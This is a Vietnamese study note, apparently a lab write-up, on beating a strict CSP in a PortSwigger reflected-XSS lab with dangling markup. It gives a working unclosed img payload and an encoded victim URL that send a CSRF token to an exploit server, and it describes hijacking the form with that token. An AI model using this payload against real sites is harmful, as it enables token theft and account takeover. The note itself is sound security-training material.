![[dangling-markup.png]]
lab CSP chặn hết script nên không alert được, phải dùng thẻ chưa đóng để trộm token.

> [!NOTE] phân tích đề
> - đề cho search reflected + CSP rất strict: `script-src 'self'`, chặn subresource ngoài.
> - mình đã check trên portswigger.net: lab "Reflected XSS protected by very strict CSP, with dangling markup attack".
> - mục tiêu không phải `alert` nữa.
> -> là đánh cắp CSRF token / nội dung trang rồi gửi về exploit server.
> - vì script bị chặn -> chuyển sang dangling markup.
> - đọc thêm [[lys thuyet XSS]] + [[CSP]] + [[Dangling Markup]].

### hướng giải
- [ ] thử `<script>alert(1)</script>` -> CSP chặn, không chạy.
- [ ] xem response -> thấy phía sau input còn có `<input hidden csrf>` / nội dung cần trộm.
- [ ] chèn thẻ `<img src="//exploit...?` chưa đóng nháy.
- [ ] trình duyệt kéo token phía sau vào `src` -> request về server mình.
- [ ] vào exploit server log -> lấy token -> hijack form.

### giải
lấy exploit server URL trước (ví dụ `https://exploit-abc.web-security-academy.net`).

payload:
```html
<img src="//exploit-abc.web-security-academy.net?x="
```

URL khai thác gửi nạn nhân:
```text
/?search=%3Cimg+src%3D%22%2F%2Fexploit-abc.web-security-academy.net%3Fx%3D%22%3E
```

response biến thành kiểu:
```html
<h1>Search: <img src="//exploit-abc.web-security-academy.net?x=""></h1>
<input type="hidden" name="csrf" value="TOKEN_HERE">
```

-> trình duyệt thấy `src="...` chưa đóng -> nó nuốt luôn đoạn sau vào URL:
```text
GET //exploit-abc.web-security-academy.net?x=""></h1><input ... value="TOKEN_HERE">...
```

kết quả:
-> log exploit server có token CSRF.
-> dùng token đó submit form đổi email / hijack là solve lab.
![[dangling-markup-result.png]]

> [!NOTE] bài học
> - sau khi quan sát lab này mình thấy... CSP chặn script không có nghĩa là hết khai thác.
> => nên mình khi thấy CSP strict thì hỏi ngay: còn thẻ nào gửi request được không (img, form, meta).
> - dangling markup là plan B khi XSS không chạy JS được mà vẫn đọc được HTML.
